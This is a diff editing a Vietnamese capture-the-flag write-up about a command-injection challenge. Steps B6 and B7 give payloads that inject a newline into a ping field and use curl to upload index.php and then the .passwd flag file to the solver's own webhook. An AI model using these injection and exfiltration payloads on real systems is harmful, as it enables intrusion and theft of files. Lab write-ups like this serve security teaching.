@@ -57,10 +57,12 @@ Tuy nhiên, kết quả trả về lại chỉ là `Ping OK`. Vậy thì làm sa
 
 => Vậy là ta có thể `curl` đến Webhook của ta.
 
-**B6:** Ta chỉ cần dùng lệnh curl để lấy file index.php đưa lên Webhook của ta thông qua payload `google.com%0Acurl+-X+POST+-F+"file=@./index.php"+https://webhook_cua_ta`
+**B6:** Ta chỉ cần dùng lệnh **curl** để lấy file `index.php` đưa lên Webhook của ta thông qua payload `google.com%0Acurl+-X+POST+-F+"file=@./index.php"+https://webhook_cua_ta`
 
-* **Giải thích:** `./index.php` nghĩa là lấy file ở `index.php` ở thư mục hiện tại. Nếu không có dấu `.` thì lệnh sẽ tìm file ở thư mục `/` và có thể gây ra lỗi.
+* **Giải thích:** `./index.php` nghĩa là lấy file `index.php` ở thư mục hiện tại. Nếu không có dấu `.` trước `/index.php` thì lệnh sẽ tìm file ở thư mục `/` và có thể gây ra lỗi.
 
-Sau khi gửi gói tin đi, trên Webhook của ta sẽ nhận được file index.php và khi tải file đó về mở ra thì ta biết được `Flag` đang nằm ở file `.passwd` cùng với thư mục chứa file `index.php`
+Sau khi gửi gói tin đi, trên Webhook của ta sẽ nhận được file `index.php` và khi tải file đó về mở ra thì ta biết được `Flag` đang nằm ở file `.passwd` cùng với thư mục chứa file `index.php`
 
 **B7:** Ta tiếp tục dùng lệnh curl trên và thay đổi thành file `.passwd`: `google.com%0Acurl+-X+POST+-F+"file=@./.passwd"+https://webhook_cua_ta`
+
+=> Cuối cùng là đọc `Flag` thôi.
